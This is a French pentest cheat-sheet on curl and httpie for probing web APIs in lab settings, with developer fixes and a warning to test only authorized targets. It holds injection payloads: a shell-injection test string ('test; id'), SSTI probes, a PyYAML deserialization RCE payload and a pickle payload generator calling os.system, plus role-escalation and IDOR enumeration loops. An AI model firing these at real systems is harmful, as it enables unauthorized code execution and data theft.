---
title: "curl et httpie : pentest web et API"
tags: [securite, web, terminal]
created: 2026-10-07
updated: 2026-10-08
status: stable
---

## En bref

Taper une requête HTTP à la main pour sonder une API ou un site : injecter un
corps, falsifier un en-tête, itérer sur des identifiants. Le réflexe à 8 h :
**casser une entrée et lire ce qui sort** avant de fuzzer à l'aveugle. curl pour
scripter, [httpie](#httpie--la-version-lisible) pour explorer vite.
Complément de [gobuster](gobuster.md) (lui cherche les chemins, curl les
interroge) dans la [méthodologie web](methodologie-pentest-web.md).

Les commandes portent des paramètres `<IP>`, `<PORT>`, `<WORDLIST>` : remplis à
la main, ou à la volée via runIt.

## Les six flags curl

Ceux qui couvrent la quasi-totalité des cas. Le reste se combine autour.

| Flag | Rôle |
| --- | --- |
| `-s` | silencieux (*silent*) : ni barre de progression ni erreur réseau |
| `-X POST` | méthode HTTP (`GET` par défaut) |
| `-H "Nom: valeur"` | ajoute un en-tête (*header*) ; répétable |
| `-d '{...}'` | corps (*body*) de la requête (implique `POST`) |
| `-i` | affiche les en-têtes de réponse en plus du corps |
| `-A "..."` | définit le User-Agent (raccourci de `-H "User-Agent: ..."`) |

Le POST JSON type, celui qu'on tape le plus souvent :

```sh
curl -s -X POST http://<IP>:<PORT>/api/endpoint \
     -H "Content-Type: application/json" \
     -d '{"data": "test"}'
```

## Scripter : `-w` et `-o`

`-w` écrit une variable de sortie (ici le code HTTP), `-o /dev/null` jette le
corps — parfait pour balayer des endpoints sans bruit :

```sh
curl -s -o /dev/null -w "%{http_code}\n" http://<IP>:<PORT>/api/users
```

Autres variables `-w` utiles : `%{size_download}` (taille), `%{time_total}`
(durée), `%{redirect_url}`. Pour un gros corps, `--data-binary @<FICHIER>`
envoie le fichier tel quel, sans réécrire les sauts de ligne.

## Découverte d'endpoints

Une fois les ports connus, cartographier les chemins cachés. [gobuster](gobuster.md),
`ffuf`, `feroxbuster` (même famille) brute-forcent une wordlist. Chemin des
listes variable — `find / -iname "*api*" 2>/dev/null` localise SecLists :

```sh
ffuf -u http://<IP>:<PORT>/FUZZ -w <WORDLIST>    # FUZZ marque l'emplacement a bruteforcer
```

Wordlists utiles :

- `dirb/common.txt` — rapide, premier passage ;
- `SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt` — gros passage ;
- `SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt` — spécial API.

Souvent plus rentable qu'une wordlist : une boucle curl sur les noms évidents du
domaine métier. **Tout ce qui n'est pas 404 est une porte.**

```sh
for p in api api/users api/user api/messages api/chat \
         api/me api/v1 login api/login admin api/admin; do
  code=$(curl -s -o /dev/null -w "%{http_code}" http://<IP>:<PORT>/$p)
  echo "$code  /$p"
done
```

Ne pas oublier le code source côté client : la page d'accueil et ses fichiers
statiques (`/static/js/*.js`) révèlent souvent endpoints, clés et logique.

```sh
curl -s http://<IP>:<PORT>/ | grep -iE "src=|href=|fetch|api|\.js|key|decrypt"
```

## Faire parler le serveur (OWASP A05)

Une appli mal configurée (*security misconfiguration*) recrache ses erreurs au
client : exception, traceback, chemins de fichiers, versions. Souvent le chemin
le plus court vers le flag. Casser chaque entrée et lire ce qui sort :

```sh
curl -s "http://<IP>:<PORT>/api/user/1'"              # une quote brise le parsing
curl -s http://<IP>:<PORT>/api/user/abc               # un type invalide
curl -s -X POST http://<IP>:<PORT>/api/process \
     -H "Content-Type: application/json" -d '{"data": 123}'
```

Un traceback renvoyé au client donne la stack, les noms de fichiers
(`/app/app.py`), les fonctions, parfois un `debug_info` ou directement le
secret. Les en-têtes de réponse trahissent la techno et les méthodes
autorisées :

```sh
curl -s -i http://<IP>:<PORT>/ | head -30                       # en-tetes + debut du corps
curl -s -X OPTIONS http://<IP>:<PORT>/api/process -i | grep -i allow
```

`Server: Werkzeug/3.1.3 Python/3.11.14` identifie le framework. Sur Flask en
mode debug, `/console` expose historiquement le debugger Werkzeug (RCE si le PIN
est désactivé ou calculable). Les champs `debug`, `debug_info`, `test`
trahissent un `DEBUG=true` oublié.

## La batterie de tests d'injection

Quand un endpoint traite ta chaîne, teste les familles une par une et observe
comment la sortie change. L'entrée discriminante et le signe qui confirme :

| Famille | Payload test | Signe de vulnérabilité |
| --- | --- | --- |
| `eval` / `exec` | `7*7` | sort `49` au lieu de `7*7` |
| SSTI (*template*) | `{{7*7}}` `${7*7}` `#{7*7}` | sort `49` (survit car sans lettre) |
| Injection shell | `test; id` `test$(id)` | apparition de `uid=... gid=...` |
| Désérialisation YAML | `"123"` (string) | erreur `'int' object has no attribute...` |
| Type confusion | `{"data": 123}` vs `"123"` | comportement différent selon le type JSON |

SSTI Jinja2 confirmé → l'accès aux globals mène au RCE. Désérialisation YAML
confirmée (vieux PyYAML, `yaml.load` sans `SafeLoader`) :

```sh
curl -s -X POST http://<IP>:<PORT>/api/process \
  -H "Content-Type: application/json" \
  -d '{"data": "!!python/object/apply:subprocess.check_output [[\"id\"]]"}'
```

Pour pickle, générer le payload encodé en base64 :

```sh
python3 -c 'import pickle,base64,os
class E:
    def __reduce__(self): return (os.system, ("id",))
print(base64.b64encode(pickle.dumps(E())).decode())'
```

**Point clé** : quand un `.upper()` ou une transformation simple masque la
logique, l'injection dans la valeur ne donne rien. Si tous les tests échouent,
la faille n'est pas dans le payload — elle est dans le code ou la conception.
Arrête de fuzzer, lis le `.py`.

## Ne jamais faire confiance au client (A01 / A04)

Broken access control (A01) et insecure design (A04) : la faille n'est pas un
bug mais une croyance du développeur — « seul notre client légitime appellera
cette API ». Tout ce qui vient du navigateur est falsifiable.

Se faire passer pour un client via le User-Agent, puis comparer la taille des
réponses pour repérer un contenu qui change :

```sh
for ua in "Mozilla/5.0 (desktop)" "okhttp/4.9.0" \
          "Dalvik/2.1.0 (Linux; U; Android 13)" "MonApp/1.0 (Android)"; do
  size=$(curl -s -A "$ua" http://<IP>:<PORT>/ | wc -c)
  echo "$size octets  <-  $ua"
done
```

En-têtes qu'une appli mobile ajoute et que le serveur croit parfois sur parole :
`X-Requested-With: com.app.id`, `X-Platform: android`, `X-Device-Type: mobile`,
`X-App-Version: 1.0`. Tester chaque endpoint avec et sans, guetter le `403 → 200`.

Escalade de privilèges par le body : si l'inscription accepte un champ `role`,
le design fait confiance au client.

```sh
curl -s -X POST http://<IP>:<PORT>/api/register \
  -H "Content-Type: application/json" \
  -d '{"user":"johndoe","pass":"x","role":"admin"}'
```

Correctif côté dev : le contrôle vit côté serveur, sur chaque endpoint, deny par
défaut ; le rôle vient de la session ou d'un JWT signé, jamais d'un champ
envoyé par le client. Distinguer l'autorisation par rôle (RBAC) de
l'autorisation sur l'objet : un user légitime qui accède à `/orders/4242` d'un
autre passe le rôle mais fait une IDOR — vérifier l'*ownership* en plus.

## Énumération de ressources (IDOR)

Dès qu'une API renvoie une ressource par identifiant sans contrôle
(`/api/user/1`, `/api/user/2`…), itérer sur les IDs fait fuiter le reste. Réflexe
à avoir **avant** de chercher un login : le flag est souvent dans un objet qu'on
n'est pas censé voir.

```sh
for i in $(seq 1 100); do
  echo "=== $i ==="
  curl -s http://<IP>:<PORT>/api/user/$i
  echo
done
```

Les identifiants ne sont pas toujours numériques. Si `/api/users` renvoie des
clés nommées (`admin`, `user1`), pivoter dessus et tester les ressources liées :

```sh
for u in admin user1 user2; do
  echo "=== $u ==="
  curl -s http://<IP>:<PORT>/api/users/$u
  curl -s http://<IP>:<PORT>/api/users/$u/messages
  curl -s http://<IP>:<PORT>/api/messages/$u
done
```

Variantes à ne pas oublier : le pluriel qui dumpe tout (`/api/users`), l'ID zéro
ou négatif (`/api/user/0`), les IDs non numériques (`/api/user/abc`, qui
déclenche en prime une erreur verbeuse), le singulier vs pluriel. Lire chaque
réponse en entier : chercher un `role: admin`, un champ `password`/`token`/
`secret`, ou un `THM{...}` directement.

## httpie : la version lisible

Pour explorer vite, `http` est plus agréable que curl : JSON automatique, sortie
colorée et formatée, syntaxe compacte. Même puissance, moins de friction.

```sh
http POST <IP>:<PORT>/api/process data=test       # chaque champ=valeur -> cle JSON (string)
http GET  <IP>:<PORT>/api/users X-Platform:android # en-tete : Nom:valeur
http POST <IP>:<PORT>/api/process data:=123        # := envoie du JSON brut (nombre)
http POST <IP>:<PORT>/api/process data:='[1,2,3]'  # tableau, objet, booleen
```

Correspondance avec les habitudes curl : `champ=valeur` → string JSON,
`champ:=valeur` → JSON brut, `Nom:valeur` → en-tête, `param==valeur` → paramètre
de query string. Options : `-v` (requête **et** réponse complètes), `-h`
(en-têtes seuls), `-b` (corps seul).

Postman est préinstallé sur l'AttackBox : même service en interface graphique,
pratique pour rejouer et organiser des collections. Pour tes propres API
(Fastify/Express), c'est le geste de tester tes endpoints avant de livrer.

## Réflexes méthodo

L'ordre des opérations compte plus que la connaissance des payloads : chercher
l'information gratuite avant de fuzzer. Les six réflexes mappent l'OWASP Top 10.

1. **Lire avant de fuzzer.** Code accessible (fichier fourni, `/static/*.js`,
   traceback) → le lire d'abord. Une backdoor `if data == "debug"` ou une clé en
   dur saute aux yeux en secondes ; la trouver en boîte noire prend une heure.
2. **Casser l'API et lire la sortie** (A05). Une quote, un type invalide : l'erreur
   verbeuse en dit souvent plus qu'un scan complet.
3. **Énumérer les ressources liées plutôt que chercher un login.** Le réflexe
   IDOR contourne l'authentification dans une majorité de cas.
4. **Lire tous les fichiers statiques et le code client** (A02). Clés, endpoints,
   logique de déchiffrement : c'est livré au navigateur, donc à toi.
5. **Ne jamais faire confiance au client** (A01/A04). User-Agent, en-têtes, champ
   `role`, contrôle dans le front : le serveur est la seule frontière de confiance.
6. **Sérier le problème.** Éliminer les hypothèses (ni eval, ni shell, ni
   SSTI…) finit par pointer la bonne piste — souvent « c'est dans la conception,
   pas dans le payload ».

## Pièges

- **Si tous les payloads échouent, lis le code.** La faille est dans la logique
  (une transformation qui masque l'entrée), pas dans ta chaîne. Continuer à
  fuzzer est du temps perdu.
- **`-d` implique `POST` et `Content-Type: application/x-www-form-urlencoded`**,
  pas JSON. Pour du JSON, toujours ajouter `-H "Content-Type: application/json"`,
  sinon le serveur parse mal et l'erreur t'égare.
- **`curl` sans `-s` pollue la sortie** (barre de progression sur `stderr`) dès
  qu'on pipe ou qu'on capture dans une variable. Le réflexe : `-s` systématique.
- **Lire la réponse en entier**, pas seulement le code HTTP : le flag, un token
  ou un `role: admin` sont dans le corps, pas dans le statut.
- **Tout ça est actif et journalisé.** Brute-force d'endpoints, injections,
  énumération : labo, THM/HTB ou engagement signé — jamais une cible tierce.

## Voir aussi

- [Méthodologie : de la reconnaissance au shell (web)](methodologie-pentest-web.md)
- [gobuster : découverte de contenu web](gobuster.md)
- [Les attaques web courantes](attaques-web.md)
- [Burp Suite Community : le proxy d'interception web](burp.md)
- [Quel outil pour quel objectif](quel-outil.md)
- [Lexique de l'évaluation de sécurité](lexique.md)
- <https://httpie.io/docs/cli>
- <https://everything.curl.dev/>
